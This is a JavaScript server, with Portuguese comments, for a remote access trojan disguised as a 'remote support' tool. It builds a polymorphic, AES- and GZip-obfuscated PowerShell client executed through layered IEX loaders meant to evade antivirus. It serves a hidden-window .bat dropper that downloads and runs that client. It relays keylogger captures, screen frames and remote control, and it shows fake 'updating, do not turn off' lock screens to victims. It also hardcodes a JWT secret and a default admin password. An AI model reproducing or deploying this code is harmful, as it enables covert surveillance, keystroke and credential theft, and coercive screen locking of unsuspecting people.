import { WebSocketServer } from 'ws';
import { v4 as uuidv4 } from 'uuid';
import { createServer } from 'http';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { join, extname } from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import zlib from 'zlib';
import crypto from 'crypto';

// Gerador de código polimórfico
function generatePolymorphicClient() {
  const randStr = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let r = chars[Math.floor(Math.random() * chars.length)];
    for (let i = 0; i < 7 + Math.floor(Math.random() * 8); i++) {
      r += chars[Math.floor(Math.random() * chars.length)];
    }
    return r;
  };

  const randNum = () => Math.floor(Math.random() * 9000) + 1000;
  const randComment = () => `# ${randStr()}${randNum()}`;
  const junk = () => {
    const junks = [
      `$${randStr()}=${randNum()}`,
      `$${randStr()}='${randStr()}'`,
      `$${randStr()}=$null`,
      `$${randStr()}=[Math]::Abs(${randNum()})`,
    ];
    return junks[Math.floor(Math.random() * junks.length)];
  };

  // Variáveis polimórficas
  const v = {
    URL: randStr(), id: randStr(), run: randStr(), panel: randStr(),
    locked: randStr(), lockProcess: randStr(), lockFile: randStr(),
    scale: randStr(), quality: randStr(), VK: randStr(),
    HWID: randStr(), Screen: randStr(), GetVK: randStr(),
    DoClick: randStr(), DoKey: randStr(), DoCombo: randStr(),
    DoScroll: randStr(), DoMove: randStr(), Lock: randStr(),
    Unlock: randStr(), Run: randStr(), inputCode: randStr(),
  };

  const originalCode = readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'public', 'client.ps1'), 'utf-8');

  let code = originalCode
    .replace(/\$Global:URL/g, `$Global:${v.URL}`)
    .replace(/\$Global:id/g, `$Global:${v.id}`)
    .replace(/\$Global:run\b/g, `$Global:${v.run}`)
    .replace(/\$Global:panel/g, `$Global:${v.panel}`)
    .replace(/\$Global:locked/g, `$Global:${v.locked}`)
    .replace(/\$Global:lockProcess/g, `$Global:${v.lockProcess}`)
    .replace(/\$Global:lockFile/g, `$Global:${v.lockFile}`)
    .replace(/\$Global:scale/g, `$Global:${v.scale}`)
    .replace(/\$Global:quality/g, `$Global:${v.quality}`)
    .replace(/\$Global:VK/g, `$Global:${v.VK}`)
    .replace(/function HWID \{/g, `function ${v.HWID} {`)
    .replace(/hwid = HWID\b/g, `hwid = ${v.HWID}`)
    .replace(/function Screen \{/g, `function ${v.Screen} {`)
    .replace(/\$cap = Screen\b/g, `$cap = ${v.Screen}`)
    .replace(/function GetVK\(/g, `function ${v.GetVK}(`)
    .replace(/= GetVK /g, `= ${v.GetVK} `)
    .replace(/function DoClick\(/g, `function ${v.DoClick}(`)
    .replace(/{ DoClick /g, `{ ${v.DoClick} `)
    .replace(/function DoKey\(/g, `function ${v.DoKey}(`)
    .replace(/{ DoKey /g, `{ ${v.DoKey} `)
    .replace(/function DoCombo\(/g, `function ${v.DoCombo}(`)
    .replace(/{ DoCombo /g, `{ ${v.DoCombo} `)
    .replace(/function DoScroll\(/g, `function ${v.DoScroll}(`)
    .replace(/{ DoScroll /g, `{ ${v.DoScroll} `)
    .replace(/function DoMove\(/g, `function ${v.DoMove}(`)
    .replace(/{ DoMove /g, `{ ${v.DoMove} `)
    .replace(/function Lock\(/g, `function ${v.Lock}(`)
    .replace(/{ Lock \$/g, `{ ${v.Lock} $`)
    .replace(/function Unlock \{/g, `function ${v.Unlock} {`)
    .replace(/; Unlock\b/g, `; ${v.Unlock}`)
    .replace(/{ Unlock }/g, `{ ${v.Unlock} }`)
    .replace(/^\s+Unlock$/gm, (match) => match.replace('Unlock', v.Unlock))
    .replace(/function Run \{/g, `function ${v.Run} {`)
    .replace(/^\s*Run\s*$/gm, v.Run)
    .replace(/\$inputCode/g, `$${v.inputCode}`);

  // Adicionar junk no início
  let junkCode = '';
  for (let i = 0; i < 5 + Math.floor(Math.random() * 10); i++) {
    junkCode += junk() + '\n';
  }

  code = `${randComment()}\n${junkCode}${randComment()}\n${code}`;

  // CAMADA 1: Comprimir com GZip
  const compressed = zlib.gzipSync(Buffer.from(code, 'utf-8'));

  // CAMADA 2: Criptografar com AES-256-CBC
  const aesKey = crypto.randomBytes(32);
  const aesIV = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, aesIV);
  const encrypted = Buffer.concat([cipher.update(compressed), cipher.final()]);

  // Converter para Base64
  const encB64 = encrypted.toString('base64');
  const keyB64 = aesKey.toString('base64');
  const ivB64 = aesIV.toString('base64');

  // Variáveis do loader interno (descriptografa e executa)
  const lv1 = { k: randStr(), i: randStr(), e: randStr(), a: randStr(), d: randStr(), m: randStr(), g: randStr(), r: randStr(), c: randStr() };

  const innerLoader = `${randComment()}
${junk()}
$${lv1.k}=[Convert]::FromBase64String('${keyB64}')
$${lv1.i}=[Convert]::FromBase64String('${ivB64}')
$${lv1.e}=[Convert]::FromBase64String('${encB64}')
$${lv1.a}=[Security.Cryptography.Aes]::Create()
$${lv1.a}.Key=$${lv1.k}
$${lv1.a}.IV=$${lv1.i}
$${lv1.a}.Mode=[Security.Cryptography.CipherMode]::CBC
$${lv1.a}.Padding=[Security.Cryptography.PaddingMode]::PKCS7
$${lv1.d}=$${lv1.a}.CreateDecryptor()
$${lv1.c}=$${lv1.d}.TransformFinalBlock($${lv1.e},0,$${lv1.e}.Length)
${junk()}
$${lv1.m}=New-Object IO.MemoryStream(,$${lv1.c})
$${lv1.g}=New-Object IO.Compression.GZipStream($${lv1.m},[IO.Compression.CompressionMode]::Decompress)
$${lv1.r}=New-Object IO.StreamReader($${lv1.g})
${junk()}
IEX $${lv1.r}.ReadToEnd()
${randComment()}`;

  // CAMADA 3: Comprimir e Base64 o loader interno
  const layer2Compressed = zlib.gzipSync(Buffer.from(innerLoader, 'utf-8'));
  const layer2B64 = layer2Compressed.toString('base64');

  // Variáveis do loader externo
  const lv2 = { d: randStr(), m: randStr(), g: randStr(), r: randStr() };

  const outerLoader = `${randComment()}
${junk()}
$${lv2.d}=[Convert]::FromBase64String('${layer2B64}')
$${lv2.m}=New-Object IO.MemoryStream(,$${lv2.d})
$${lv2.g}=New-Object IO.Compression.GZipStream($${lv2.m},[IO.Compression.CompressionMode]::Decompress)
$${lv2.r}=New-Object IO.StreamReader($${lv2.g})
${junk()}
IEX $${lv2.r}.ReadToEnd()
${randComment()}`;

  return outerLoader;
}

// Get country from IP
async function getCountryFromIP(ip) {
  try {
    // Clean IP
    const cleanIP = ip.replace('::ffff:', '').split(',')[0].trim();
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') return 'LOCAL';

    const res = await fetch(`http://ip-api.com/json/${cleanIP}?fields=countryCode`);
    const data = await res.json();
    return data.countryCode || 'XX';
  } catch (e) {
    return 'XX';
  }
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const PORT = process.env.PORT || 3001;

// CHAVE FIXA - não muda entre deploys
const JWT_SECRET = 'RD_JWT_Secret_Key_2026_FIXED_abc123xyz789';

const DEVICES_FILE = join(__dirname, 'devices.json');
const USERS_FILE = join(__dirname, 'users.json');
const LOCKSCREENS_FILE = join(__dirname, 'lockscreens.json');

const MIME_TYPES = {
  '.html': 'text/html',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.py': 'text/plain',
  '.exe': 'application/octet-stream'
};

// Dados
let allDevices = {};
if (existsSync(DEVICES_FILE)) {
  try {
    allDevices = JSON.parse(readFileSync(DEVICES_FILE, 'utf-8'));
    Object.keys(allDevices).forEach(id => { allDevices[id].online = false; });
  } catch (e) { allDevices = {}; }
}

let users = {};
if (existsSync(USERS_FILE)) {
  try {
    users = JSON.parse(readFileSync(USERS_FILE, 'utf-8'));
  } catch (e) { users = {}; }
}

if (Object.keys(users).length === 0) {
  users['admin'] = {
    password: bcrypt.hashSync('admin123', 10),
    role: 'admin'
  };
  saveUsers();
  console.log('Admin criado: admin / admin123');
}

// Lock Screens
let lockScreens = [];
if (existsSync(LOCKSCREENS_FILE)) {
  try {
    lockScreens = JSON.parse(readFileSync(LOCKSCREENS_FILE, 'utf-8'));
  } catch (e) { lockScreens = []; }
}

// Template UPDATE padrão - sempre garantir que existe
const UPDATE_TEMPLATE = {
  id: 'update',
  name: 'UPDATE',
  html: `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"></head><body style="margin:0;padding:0;background:#1565c0;height:100vh;display:table;width:100%;font-family:Segoe UI,Arial,sans-serif;"><div style="display:table-cell;vertical-align:middle;text-align:center;"><h1 style="color:white;font-size:42px;font-weight:300;margin:0 0 15px 0;">Trabalhando em atualizações</h1><p style="color:rgba(255,255,255,0.8);font-size:18px;margin:0 0 40px 0;">Não desligue o computador</p><div style="width:50px;height:50px;border:4px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;margin:0 auto;animation:spin 1s linear infinite;"></div></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style></body></html>`
};

// Garantir que UPDATE existe e é o primeiro
const hasUpdate = lockScreens.some(ls => ls.id === 'update');
if (!hasUpdate) {
  lockScreens.unshift(UPDATE_TEMPLATE);
  saveLockScreens();
} else {
  // Atualizar HTML do UPDATE se já existe
  const idx = lockScreens.findIndex(ls => ls.id === 'update');
  if (idx > 0) {
    // Mover para o início
    const update = lockScreens.splice(idx, 1)[0];
    lockScreens.unshift(update);
    saveLockScreens();
  }
}

if (lockScreens.length === 0) {
  lockScreens = [
    UPDATE_TEMPLATE,
    {
      id: 'default',
      name: 'Suporte Tecnico',
      html: `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"></head><body style="margin:0;padding:0;background:linear-gradient(135deg,#0a0a0f 0%,#1a1a2e 100%);height:100vh;display:table;width:100%;font-family:Segoe UI,Arial,sans-serif;"><div style="display:table-cell;vertical-align:middle;text-align:center;"><h1 style="color:white;font-size:48px;font-weight:300;margin:0 0 20px 0;">Aguarde o tecnico...</h1><div style="width:50px;height:50px;border:3px solid rgba(255,255,255,0.1);border-top-color:#3b82f6;border-radius:50%;margin:30px auto;animation:spin 1s linear infinite;"></div><p style="color:rgba(255,255,255,0.6);font-size:18px;margin:0;">Por favor, aguarde o tecnico liberar a tela.</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style></body></html>`
    },
    {
      id: 'bloqueado',
      name: 'Computador Bloqueado',
      html: `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"></head><body style="margin:0;padding:0;background:linear-gradient(135deg,#2d1f3d 0%,#1a1a2e 100%);height:100vh;display:table;width:100%;font-family:Segoe UI,Arial,sans-serif;"><div style="display:table-cell;vertical-align:middle;text-align:center;"><div style="font-size:100px;margin-bottom:30px;">🔒</div><h1 style="color:white;font-size:36px;font-weight:300;margin:0 0 15px 0;">Computador Bloqueado</h1><p style="color:rgba(255,255,255,0.5);font-size:16px;margin:0;">Este computador foi bloqueado pelo administrador.</p></div></body></html>`
    }
  ];
  saveLockScreens();
}

function saveLockScreens() {
  try { writeFileSync(LOCKSCREENS_FILE, JSON.stringify(lockScreens, null, 2)); } catch (e) {}
}

function saveDevices() {
  try { writeFileSync(DEVICES_FILE, JSON.stringify(allDevices, null, 2)); } catch (e) {}
}

function saveUsers() {
  try { writeFileSync(USERS_FILE, JSON.stringify(users, null, 2)); } catch (e) {}
}

// Conexões
const clients = new Map();
const panels = new Map();

// HTTP Server
const server = createServer((req, res) => {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  // Login
  if (req.url === '/api/login' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { username, password } = JSON.parse(body);
        const user = users[username];

        if (user && bcrypt.compareSync(password, user.password)) {
          const token = jwt.sign({ username, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ token, username, role: user.role }));
        } else {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Credenciais inválidas' }));
        }
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Erro' }));
      }
    });
    return;
  }

  // Verify
  if (req.url === '/api/verify' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { token } = JSON.parse(body);
        const decoded = jwt.verify(token, JWT_SECRET);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ valid: true, username: decoded.username, role: decoded.role }));
      } catch (e) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ valid: false }));
      }
    });
    return;
  }

  // Lock Screens - Listar
  if (req.url === '/api/lockscreens' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(lockScreens));
    return;
  }

  // Lock Screens - Criar
  if (req.url === '/api/lockscreens' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { name, html } = JSON.parse(body);
        if (!name || !html) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'name e html sao obrigatorios' }));
          return;
        }
        const id = 'ls_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        lockScreens.push({ id, name, html });
        saveLockScreens();
        res.writeHead(201, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ id, name }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON invalido' }));
      }
    });
    return;
  }

  // Lock Screens - Atualizar
  if (req.url.startsWith('/api/lockscreens/') && req.method === 'PUT') {
    const id = req.url.split('/')[3];
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { name, html } = JSON.parse(body);
        const idx = lockScreens.findIndex(ls => ls.id === id);
        if (idx === -1) {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Lock screen nao encontrado' }));
          return;
        }
        if (name) lockScreens[idx].name = name;
        if (html) lockScreens[idx].html = html;
        saveLockScreens();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(lockScreens[idx]));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON invalido' }));
      }
    });
    return;
  }

  // Lock Screens - Deletar
  if (req.url.startsWith('/api/lockscreens/') && req.method === 'DELETE') {
    const id = req.url.split('/')[3];
    const idx = lockScreens.findIndex(ls => ls.id === id);
    if (idx === -1) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Lock screen nao encontrado' }));
      return;
    }
    lockScreens.splice(idx, 1);
    saveLockScreens();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  // Servir arquivos
  if (req.url === '/c') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('RemoteSupport.exe');
    return;
  }

  // Client.ps1 polimórfico
  if (req.url === '/client.ps1') {
    try {
      const polyCode = generatePolymorphicClient();
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end(polyCode);
    } catch (e) {
      res.writeHead(500);
      res.end('Error generating client');
    }
    return;
  }

  // BAT polimórfico com hash único
  if (req.url.match(/^\/support_[A-F0-9]+\.bat$/i) || req.url === '/download.bat') {
    const host = req.headers.host || 'localhost:3001';
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const baseUrl = `${protocol}://${host}`;

    const bat = `@echo off
powershell -w hidden -ep bypass -c "irm '${baseUrl}/client.ps1'|iex"
exit`;

    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': `attachment; filename="support_${crypto.randomBytes(6).toString('hex').toUpperCase()}.bat"`
    });
    res.end(bat);
    return;
  }

  // Gerar link de BAT com hash único
  if (req.url === '/generate-bat') {
    const hash = crypto.randomBytes(6).toString('hex').toUpperCase();
    const host = req.headers.host || 'localhost:3001';
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ url: `${protocol}://${host}/support_${hash}.bat`, filename: `support_${hash}.bat` }));
    return;
  }

  let filePath = join(__dirname, 'public', req.url === '/' ? 'index.html' : req.url);
  if (!existsSync(filePath)) {
    filePath = join(__dirname, 'public', 'index.html');
  }

  try {
    const content = readFileSync(filePath);
    const ext = extname(filePath);
    res.writeHead(200, { 'Content-Type': MIME_TYPES[ext] || 'text/plain' });
    res.end(content);
  } catch (err) {
    res.writeHead(404);
    res.end('Not found');
  }
});

// WebSocket
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  let clientId = null;
  let role = null;
  let authenticated = false;
  let username = null;
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data);

      // Auth do painel
      if (msg.type === 'auth') {
        try {
          const decoded = jwt.verify(msg.token, JWT_SECRET);
          authenticated = true;
          username = decoded.username;
          role = 'panel';
          clientId = 'panel-' + uuidv4().slice(0, 6);
          panels.set(clientId, ws);
          ws.send(JSON.stringify({ type: 'auth-success', panelId: clientId }));
          sendDeviceList(ws);
        } catch (e) {
          ws.send(JSON.stringify({ type: 'auth-failed', message: 'Token inválido' }));
        }
        return;
      }

      // Screen frames
      if (msg.type === 'screen-frame') {
        panels.forEach((panelWs) => {
          if (panelWs.readyState === 1) {
            panelWs.send(JSON.stringify({
              type: 'screen-frame',
              clientId: msg.clientId,
              frame: msg.frame,
              width: msg.width,
              height: msg.height
            }));
          }
        });
        return;
      }

      // Captured keys from client
      if (msg.type === 'captured-keys') {
        panels.forEach((panelWs) => {
          if (panelWs.readyState === 1) {
            panelWs.send(JSON.stringify({
              type: 'captured-keys',
              clientId: msg.clientId,
              keys: msg.keys
            }));
          }
        });
        return;
      }

      // Registro de cliente
      if (msg.type === 'register-client') {
        let existingId = null;
        Object.keys(allDevices).forEach(id => {
          if (allDevices[id].hwid === msg.hwid && msg.hwid !== 'N/A') {
            existingId = id;
          }
        });

        clientId = existingId || uuidv4().slice(0, 8).toUpperCase();
        role = 'client';
        authenticated = true;

        // Get country async
        getCountryFromIP(clientIp).then(country => {
          allDevices[clientId] = {
            hostname: msg.hostname || 'Unknown',
            username: msg.username || 'Unknown',
            os: msg.os || 'Unknown',
            ip: clientIp,
            country: country,
            hwid: msg.hwid || 'N/A',
            online: true,
            lastSeen: new Date().toISOString(),
            firstSeen: allDevices[clientId]?.firstSeen || new Date().toISOString()
          };

          clients.set(clientId, { ws });
          saveDevices();
          ws.send(JSON.stringify({ type: 'registered', clientId }));
          broadcastDeviceList();
        });
        return;
      }

      if (!authenticated) return;

      switch (msg.type) {
        case 'connect-to-client': {
          const target = clients.get(msg.targetId);
          if (target) {
            target.ws.send(JSON.stringify({ type: 'panel-connected', panelId: clientId }));
            ws.send(JSON.stringify({ type: 'connected-to-client', clientId: msg.targetId }));
          }
          break;
        }

        case 'disconnect-from-client': {
          const target = clients.get(msg.targetId);
          if (target) target.ws.send(JSON.stringify({ type: 'panel-disconnected' }));
          break;
        }

        case 'mouse-move':
        case 'mouse-click':
        case 'mouse-scroll':
        case 'key-press':
        case 'key-combination': {
          console.log(`[${msg.type}] targetId=${msg.targetId} x=${msg.x} y=${msg.y}`);
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify(msg));
            console.log(`  -> Enviado para cliente`);
          } else {
            console.log(`  -> Cliente não encontrado ou desconectado`);
          }
          break;
        }

        case 'clipboard-set': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'clipboard-set', content: msg.content }));
          }
          break;
        }

        case 'file-upload': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'file-upload', filename: msg.filename, content: msg.content }));
          }
          break;
        }

        case 'file-upload-result': {
          panels.forEach((panelWs) => {
            if (panelWs.readyState === 1) {
              panelWs.send(JSON.stringify({ type: 'file-upload-result', clientId: msg.clientId, success: msg.success, filename: msg.filename, error: msg.error }));
            }
          });
          break;
        }

        case 'disconnect-client': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'disconnect-client' }));
            target.ws.close();
          }
          clients.delete(msg.targetId);
          if (allDevices[msg.targetId]) {
            allDevices[msg.targetId].online = false;
            allDevices[msg.targetId].lastSeen = new Date().toISOString();
            saveDevices();
          }
          broadcastDeviceList();
          break;
        }

        case 'set-quality': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'set-quality', quality: msg.quality, scale: msg.scale }));
          }
          break;
        }

        case 'lock-screen': {
          const target = clients.get(msg.targetId);
          console.log('[LOCK] Recebido html:', msg.html ? `${msg.html.length} chars` : 'VAZIO');
          if (target?.ws.readyState === 1) {
            const lockMsg = { type: 'lock-screen', html: msg.html || '' };
            console.log('[LOCK] Enviando para cliente:', lockMsg.html ? `${lockMsg.html.length} chars` : 'VAZIO');
            target.ws.send(JSON.stringify(lockMsg));
          }
          // Salvar estado de lock
          if (allDevices[msg.targetId]) {
            allDevices[msg.targetId].locked = true;
            saveDevices();
          }
          break;
        }

        case 'unlock-screen': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'unlock-screen' }));
          }
          // Salvar estado de unlock
          if (allDevices[msg.targetId]) {
            allDevices[msg.targetId].locked = false;
            saveDevices();
          }
          break;
        }

        case 'get-lock-state': {
          const device = allDevices[msg.targetId];
          ws.send(JSON.stringify({
            type: 'lock-state',
            targetId: msg.targetId,
            locked: device?.locked || false
          }));
          break;
        }

        case 'remove-device': {
          if (allDevices[msg.targetId]) {
            delete allDevices[msg.targetId];
            saveDevices();
            broadcastDeviceList();
          }
          break;
        }

        case 'start-capture': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'start-capture' }));
          }
          if (allDevices[msg.targetId]) {
            allDevices[msg.targetId].capturing = true;
            saveDevices();
          }
          break;
        }

        case 'stop-capture': {
          const target = clients.get(msg.targetId);
          if (target?.ws.readyState === 1) {
            target.ws.send(JSON.stringify({ type: 'stop-capture' }));
          }
          if (allDevices[msg.targetId]) {
            allDevices[msg.targetId].capturing = false;
            saveDevices();
          }
          break;
        }

        case 'get-capture-state': {
          const device = allDevices[msg.targetId];
          ws.send(JSON.stringify({
            type: 'capture-state',
            targetId: msg.targetId,
            capturing: device?.capturing || false
          }));
          break;
        }
      }
    } catch (err) {
      console.error('Error:', err.message);
    }
  });

  ws.on('close', () => {
    if (role === 'client' && clientId) {
      clients.delete(clientId);
      if (allDevices[clientId]) {
        allDevices[clientId].online = false;
        allDevices[clientId].lastSeen = new Date().toISOString();
        saveDevices();
      }
      broadcastDeviceList();
    } else if (role === 'panel' && clientId) {
      panels.delete(clientId);
    }
  });
});

function broadcastDeviceList() {
  const list = getDeviceList();
  panels.forEach((panelWs) => {
    if (panelWs.readyState === 1) {
      panelWs.send(JSON.stringify({ type: 'device-list', devices: list }));
    }
  });
}

function sendDeviceList(ws) {
  ws.send(JSON.stringify({ type: 'device-list', devices: getDeviceList() }));
}

function getDeviceList() {
  const list = [];
  Object.keys(allDevices).forEach(id => {
    list.push({ id, ...allDevices[id] });
  });
  list.sort((a, b) => {
    if (a.online && !b.online) return -1;
    if (!a.online && b.online) return 1;
    return new Date(b.lastSeen) - new Date(a.lastSeen);
  });
  return list;
}

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
